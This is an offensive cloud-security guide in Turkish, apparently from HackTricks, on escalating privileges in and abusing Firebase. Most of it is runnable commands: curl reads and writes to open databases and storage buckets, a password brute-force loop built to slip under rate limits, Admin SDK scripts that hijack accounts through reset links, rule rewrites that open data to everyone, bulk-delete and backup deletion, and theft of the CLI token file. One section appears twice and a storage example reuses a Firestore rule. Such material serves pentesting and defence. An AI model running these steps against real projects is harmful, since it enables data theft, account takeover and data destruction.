# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
An attacker bu saldırıyı gerçekleştirmek için özel Firebase izinlerine ihtiyaç duymaz. Gerekli olan tek şey, Firebase Realtime Database güvenlik kurallarında `.read: true` veya `.write: true` olarak ayarlanmış ve herkese açık okuma veya yazma erişimi veren savunmasız bir yapılandırmanın bulunmasıdır.

Attacker veritabanı URL'sini tespit etmelidir; genellikle format şu şekildedir: `https://<project-id>.firebaseio.com/`.

Bu URL, mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps) yoluyla bulunabilir; ayrıca google-services.json (Android) veya GoogleService-Info.plist (iOS) gibi yapılandırma dosyalarının analizi, web uygulamalarının kaynak kodunun incelenmesi veya `*.firebaseio.com` alanlarına yapılan istekleri tespit etmek için ağ trafiğinin incelenmesi ile de tespit edilebilir.

Attacker veritabanı URL'sini tespit eder, bunun herkese açık olarak erişilebilir olup olmadığını kontrol eder, ardından veriye erişir ve potansiyel olarak zararlı bilgiler yazar.

Öncelikle URL'ye .json ekleyerek veritabanının okuma erişimine izin verip vermediğini kontrol ederler.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Eğer yanıt JSON verisi veya null (\"Permission Denied\" yerine) içeriyorsa, veritabanı read access'e izin verir. Write access'i kontrol etmek için saldırgan, Firebase REST API'yi kullanarak bir test write request göndermeyi deneyebilir.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
İşlem başarılı olursa, veritabanı aynı zamanda yazma erişimine de izin verir.

### Cloud Firestore'da verilerin açığa çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için belirli Firebase izinlerine ihtiyacı yoktur. Bunun için yalnızca Cloud Firestore güvenlik kurallarında, kuralların kimlik doğrulama olmadan veya yetersiz doğrulama ile okuma veya yazma erişimine izin verdiği bir zayıf yapılandırma olması gerekir. Tam erişim veren yanlış yapılandırılmış bir kural örneği:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural herkese tüm dokümanları herhangi bir kısıtlama olmaksızın okuma ve yazma izni verir. Firestore kuralları ayrıntılıdır ve koleksiyon ve doküman bazında uygulanır; bu nedenle belirli bir kuraldaki bir hata yalnızca bazı koleksiyonları açığa çıkarabilir.

Saldırgan, Firebase Project ID'yi tespit etmelidir; bu ID mobil uygulama reverse engineering, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analizi, web uygulamalarının kaynak kodunun incelenmesi veya ağ trafiğinin analizi yoluyla firestore.googleapis.com'a yapılan isteklerin tespit edilmesi ile bulunabilir.
Firestore REST API şu formatı kullanır:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Eğer kurallar unauthenticated read access'e izin veriyorsa, attacker collections ve documents'ı okuyabilir. İlk olarak, belirli bir collection'a erişmeyi denerler:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Cevap bir permission error yerine JSON belgeleri içeriyorsa, collection açığa çıkmıştır. Attacker, yaygın isimleri deneyerek veya uygulamanın yapısını analiz ederek erişilebilir tüm collection'ları enumerate edebilir. Belirli bir document'e erişmek için:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Kurallar kimlik doğrulaması gerektirmeyen yazma erişimine izin veriyorsa veya yetersiz doğrulama varsa, saldırgan yeni belgeler oluşturabilir:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Mevcut bir belgeyi değiştirmek için PATCH kullanılmalıdır:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Bir belgeyi silmek ve denegación de servicio oluşturmak için:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage'daki dosyaların açığa çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için özel bir Firebase iznine ihtiyacı yoktur. Bunun için sadece Firebase Storage security rules'ta, kuralların kimlik doğrulama olmadan veya yetersiz doğrulama ile okuma veya yazma erişimine izin verdiği bir zayıf yapılandırmanın bulunması yeterlidir. Storage rules okuma ve yazma izinlerini bağımsız olarak kontrol eder, bu nedenle bir kuraldaki bir hata yalnızca okuma erişimini, yalnızca yazma erişimini veya her ikisini birden açığa çıkarabilir. Tam erişim veren yanlış yapılandırılmış bir kural örneği şudur:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural, tüm belgeler için herhangi bir kısıtlama olmaksızın okuma ve yazma erişimine izin verir. Firestore kuralları granulardır ve koleksiyon başına ve belge başına uygulanır, bu nedenle belirli bir kural hatası yalnızca bazı koleksiyonları açığa çıkarabilir. Saldırgan, Firebase Project ID'yi belirlemelidir; bu, mobile application reverse engineering, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analizi, web uygulaması kaynak kodunun incelenmesi veya firestore.googleapis.com'a yönelik istekleri tespit etmek için network traffic analysis yoluyla bulunabilir.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Eğer kurallar kimlik doğrulaması olmayan okuma erişimine izin veriyorsa, saldırgan koleksiyonları ve belgeleri okuyabilir. Önce belirli bir koleksiyona erişmeye çalışırlar.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Eğer yanıt bir izin hatası yerine dosyaların listesini içeriyorsa, dosya açığa çıkmış demektir. Saldırgan, dosyaların içeriğini yolunu belirterek görüntüleyebilir:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Kurallar kimlik doğrulaması olmadan yazma erişimine izin veriyorsa veya yetersiz doğrulama varsa, saldırgan kötü amaçlı dosyalar yükleyebilir. REST API üzerinden bir dosya yüklemek için:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Saldırgan, denial of service'e yol açmak için code shells, malware payloads veya büyük dosyalar yükleyebilir. Eğer uygulama yüklenen dosyaları işler veya çalıştırırsa, saldırgan remote code execution elde edebilir. Dosyaları silmek ve denial of service'e neden olmak için:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Kamuya açık Firebase Cloud Functions'ın çağrılması
Bir saldırganın bu güvenlik açığından yararlanmak için herhangi bir özel Firebase iznine ihtiyacı yoktur; sadece bir Cloud Function'ın kimlik doğrulama olmadan HTTP üzerinden herkese açık erişime sahip olması gerekir.

Bir fonksiyon şu durumlarda savunmasızdır:

- functions.https.onRequest kullanır; bu, onCall fonksiyonlarının aksine kimlik doğrulamasını zorunlu kılmaz.
- Fonksiyonun kodu kullanıcı kimlik doğrulamasını doğrulamaz (ör. request.auth veya context.auth için kontroller yok).
- Fonksiyon IAM'de herkese açık olarak erişilebilir, yani allUsers roles/cloudfunctions.invoker rolüne sahiptir. Bu, geliştirici erişimi kısıtlamadıkça HTTP fonksiyonları için varsayılan davranıştır.

Firebase HTTP Cloud Functions şu tür URL'ler üzerinden erişilebilir:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Bir saldırgan bu URL'leri kaynak kodu analizi, ağ trafiği incelemesi, enumeration tools veya mobile app reverse engineering yoluyla keşfedebilir.
Fonksiyon herkese açık ve kimlik doğrulaması yapılmamış durumdaysa, saldırgan onu herhangi bir kimlik bilgisi olmadan doğrudan çağırabilir.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Eğer fonksiyon girdileri düzgün şekilde doğrulanmazsa, saldırgan code injection veya command injection gibi diğer saldırılara girişebilir.


### Brute-force attack against Firebase Authentication with a weak password policy
Bir saldırganın bu saldırıyı gerçekleştirmek için herhangi bir özel Firebase iznine ihtiyacı yoktur. Tek gereksinim, Firebase API Key'in mobil veya web uygulamalarında açığa çıkmış olması ve parola politikasının varsayılanlardan daha sıkı gereksinimlerle yapılandırılmamış olmasıdır.

Saldırgan, Firebase API Key'i tespit etmelidir; bu, mobile app reverse engineering, google-services.json veya GoogleService-Info.plist gibi konfigürasyon dosyalarının analizi, web uygulamalarının kaynak kodunun incelenmesi (ör. bootstrap.js içinde) veya ağ trafiğinin analizi ile bulunabilir.

Firebase Authentication’ın REST API'si, e-posta ve parola ile kimlik doğrulamak için şu endpoint'i kullanır: `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Email Enumeration Protection devre dışıysa, API hata yanıtları bir e-postanın sistemde var olup olmadığını ortaya çıkarabilir (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), bu da saldırganların parola tahmini yapmadan önce kullanıcıları listelemesine olanak tanır. Bu koruma etkinleştirildiğinde API, var olmayan e-postalar ve hatalı parolalar için aynı hata mesajını döndürerek kullanıcı listelemesini engeller.

Firebase Authentication'ın rate limiting uyguladığını ve çok kısa sürede çok fazla kimlik doğrulama denemesi olması halinde istekleri engelleyebileceğini not etmek önemlidir. Bu nedenle saldırganın rate-limited olmamak için denemeler arasında gecikmeler eklemesi gerekir.

Saldırgan API Key'i tespit eder ve bilinen hesaplara karşı birden fazla parola ile kimlik doğrulama denemeleri yapar. Email Enumeration Protection devre dışıysa, saldırgan hata yanıtlarını analiz ederek mevcut kullanıcıları listeleyebilir:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Yanıt EMAIL_NOT_FOUND içeriyorsa, e-posta sistemde mevcut değildir. INVALID_PASSWORD içeriyorsa, e-posta kayıtlıdır ancak şifre yanlış, bu da kullanıcının kayıtlı olduğunu doğrular. Geçerli bir kullanıcı tespit edildikten sonra saldırgan brute-force denemeleri yapabilir. Denemeler arasında Firebase Authentication'ın hız sınırlama mekanizmalarına takılmamak için duraklamalar eklemek önemlidir:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Varsayılan parola politikası (minimum 6 karakter, karmaşıklık gereksinimi yok), saldırganın tüm olası 6 karakterli parola kombinasyonlarını denemesine izin verir; bu, daha sıkı parola politikalarına kıyasla nispeten küçük bir arama alanı oluşturur.

### Firebase Authentication'da kullanıcı yönetimi

Saldırganın bu saldırıyı gerçekleştirebilmesi için belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler şunlardır:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Bu izinler `roles/firebaseauth.admin` rolünde bulunur; bu rol Firebase Authentication kaynaklarına tam okuma/yazma erişimi sağlar. Ayrıca roles/firebase.developAdmin (tüm firebaseauth.* izinlerini içerir) ve roles/firebase.admin (tüm Firebase hizmetlerine tam erişim) gibi daha üst düzey rollerde de mevcutturlar.

Firebase Admin SDK'yı kullanmak için saldırganın servis hesabı kimlik bilgilerine (JSON dosyası) erişimi olması gerekir; bunlar ele geçirilmiş sistemlerde, kamuya açık kod depolarında, ele geçirilmiş CI/CD sistemlerinde veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesi yoluyla bulunabilir.

İlk adım, servis hesabı kimlik bilgilerini kullanarak Firebase Admin SDK'yı yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Bir kurbanın e-postasını kullanarak kötü amaçlı bir kullanıcı oluşturmak için saldırgan, Firebase Admin SDK'yı kullanarak o e-posta altında yeni bir hesap oluşturmayı deneyecektir.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan, e-posta adresi, doğrulama durumu veya hesabın devre dışı olup olmadığı gibi alanları günceller.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silmek ve denial of service'a neden olmak için, saldırgan kullanıcıyı tamamen kaldırmak amacıyla bir istek gönderir.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan, UID veya e-posta adresini isteyerek mevcut kullanıcılar hakkında bilgi de alabilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Ayrıca, saldırgan bir kullanıcının şifresini değiştirmek ve hesabına erişim sağlamak için doğrulama veya şifre sıfırlama bağlantıları oluşturabilir.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication'da kullanıcı yönetimi
Bir saldırganın bu saldırıyı gerçekleştirebilmesi için belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler:

- `firebaseauth.users.create` kullanıcı oluşturmak için
- `firebaseauth.users.update` mevcut kullanıcıları güncellemek için
- `firebaseauth.users.delete` kullanıcıları silmek için
- `firebaseauth.users.get` kullanıcı bilgilerini almak için
- `firebaseauth.users.sendEmail` kullanıcılara e-posta göndermek için
- `firebaseauth.users.createSession` kullanıcı oturumları oluşturmak için

Bu izinler roles/firebaseauth.admin rolüne dahildir; bu rol Firebase Authentication kaynaklarına tam okuma/yazma erişimi verir. Ayrıca `roles/firebase.developAdmin` (tüm firebaseauth.* izinlerini içerir) ve `roles/firebase.admin` (tüm Firebase hizmetlerine tam erişim) gibi daha üst düzey rollerin de parçasıdır.

Firebase Admin SDK'yı kullanmak için saldırganın service account credentials (a JSON file) erişimine ihtiyacı olur; bu bilgiler ele geçirilmiş sistemlerden, herkese açık hale gelmiş kod depolarından, ele geçirilmiş CI/CD ortamlarından veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesinden elde edilebilir.

İlk adım, service account credentials kullanarak Firebase Admin SDK'yı yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Kurbanın e-posta adresini kullanarak kötü amaçlı bir kullanıcı oluşturmak için saldırgan, o e-posta ile yeni bir kullanıcı hesabı oluşturmaya ve kendi şifresini ve profil bilgilerini atamaya çalışır.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan, e-posta adresi, doğrulama durumu veya hesabın devre dışı bırakılıp bırakılmadığı gibi alanları değiştirir.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silmek — aslında bir denial of service'e yol açarak — saldırgan o kullanıcıyı kalıcı olarak kaldırmak için bir istekte bulunurdu.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan, kullanıcı ayrıntılarını UID veya email adresiyle isteyerek mevcut kullanıcıların UID veya email gibi bilgilerini alabilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Buna ek olarak, saldırgan doğrulama linkleri veya şifre sıfırlama linkleri oluşturabilir; bu da bir kullanıcının şifresini değiştirerek hesabın kontrolünü ele geçirmelerine olanak tanır.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase hizmetlerinde güvenlik kurallarının değiştirilmesi
Saldırganın güvenlik kurallarını değiştirebilmesi için hizmete bağlı olarak belirli izinlere ihtiyacı vardır. Cloud Firestore ve Firebase Cloud Storage için gerekli izinler, ruleset oluşturmak için `firebaserules.rulesets.create` ve release dağıtmak için `firebaserules.releases.create`'tır. Bu izinler `roles/firebaserules.admin` rolünde veya `roles/firebase.developAdmin` ve `roles/firebase.admin` gibi daha üst düzey rollerde bulunur. Firebase Realtime Database için gerekli izin `firebasedatabase.instances.update`'dir.

Saldırganın güvenlik kurallarını değiştirmek için Firebase REST API'yi kullanması gerekir. Öncelikle saldırganın service account kimlik bilgilerini kullanarak bir access token alması gerekir.
Token almak için:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database kurallarını değiştirmek için:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore kurallarını değiştirmek için saldırgan bir ruleset oluşturmalı ve ardından dağıtmalıdır:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut projects/<project-id>/rulesets/<ruleset-id> formatında bir ruleset adı döndürür. Yeni sürümü dağıtmak için release, bir PATCH request kullanılarak güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage kurallarını değiştirmek için:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut projects/<project-id>/rulesets/<ruleset-id> biçiminde bir ruleset adı döndürür. Yeni sürümü dağıtmak için release, bir PATCH isteği kullanılarak güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore'da veri sızdırma ve manipülasyon
Cloud Firestore, Cloud Datastore ile aynı altyapı ve izin sistemini kullanır, bu nedenle Datastore IAM izinleri doğrudan Firestore'a uygulanır. TTL politikalarını manipüle etmek için `datastore.indexes.update` izni gereklidir. Veriyi dışa aktarmak için `datastore.databases.export` izni gereklidir. Veriyi içe aktarmak için datastore.databases.import izni gereklidir. Toplu veri silme işlemi gerçekleştirmek için `datastore.databases.bulkDelete` izni gereklidir.

Yedekleme ve geri yükleme işlemleri için belirli izinler gereklidir:

- `datastore.backups.get` and `datastore.backups.list` kullanılabilir yedeklerin listesini almak ve detaylarını görüntülemek için
- `datastore.backups.delete` yedekleri silmek için
- `datastore.backups.restoreDatabase` bir yedeğe ait veritabanını geri yüklemek için
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` yedekleme zamanlamalarını yönetmek için

Bir TTL politikası oluşturulduğunda, silinmeye uygun varlıkları belirlemek için atanmış bir özellik seçilir. Bu TTL özelliği Date and time türünde olmalıdır. Saldırgan, zaten var olan bir özelliği seçebilir veya daha sonra eklemeyi planladığı bir özelliği atayabilir. Alanın değeri geçmiş bir tarihe aitse, doküman derhal silinmeye uygun hale gelir. Saldırgan, TTL politikalarını manipüle etmek için gcloud CLI'yi kullanabilir.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Verileri dışa aktarmak ve exfiltrate etmek için saldırgan gcloud CLI'yi kullanabilir.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Kötü amaçlı verileri içe aktarmak için:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Toplu veri silimi gerçekleştirmek ve bir denial of service oluşturmak için saldırgan, tüm koleksiyonları kaldırmak amacıyla gcloud Firestore bulk-delete aracını kullanabilir.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Yedekleme ve geri yükleme işlemleri için saldırgan, veritabanının mevcut durumunu yakalamak üzere zamanlanmış yedekler oluşturabilir, mevcut yedekleri listeleyebilir, son değişiklikleri üzerine yazmak için bir yedekten geri yükleme yapabilir, kalıcı veri kaybına yol açmak için yedekleri silebilir ve zamanlanmış yedekleri kaldırabilir.
Hemen bir yedek oluşturan günlük bir yedekleme takvimi oluşturmak için:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Belirli bir yedekten geri yükleme yapmak için, saldırgan o yedekteki verileri kullanarak yeni bir veritabanı oluşturabilir. Geri yükleme işlemi yedeğin verilerini yeni bir veritabanına yazar; bu nedenle var olan bir DATABASE_ID kullanılamaz.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Bir backup'ı silmek ve kalıcı veri kaybına neden olmak için:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI kimlik bilgilerini çalma ve kötüye kullanma
Bu saldırıyı gerçekleştirmek için saldırganın özel Firebase izinlerine ihtiyacı yoktur; ancak geliştiricinin yerel sistemine veya Firebase CLI kimlik bilgileri dosyasına erişimi olmalıdır. Bu kimlik bilgileri şu konumdaki bir JSON dosyasında saklanır:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Bu dosya, saldırgana firebase login komutunu ilk çalıştıran kullanıcı olarak kimlik doğrulama imkanı veren refresh_token ve access_token dahil olmak üzere kimlik doğrulama token'larını içerir.

Saldırgan Firebase CLI kimlik bilgileri dosyasına erişim sağlar. Daha sonra dosyanın tamamını kendi sistemine kopyalayabilir ve Firebase CLI varsayılan konumundan bu kimlik bilgilerini otomatik olarak kullanır. Bunu yaptıktan sonra saldırgan, o kullanıcının erişebildiği tüm Firebase projelerini görebilir.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
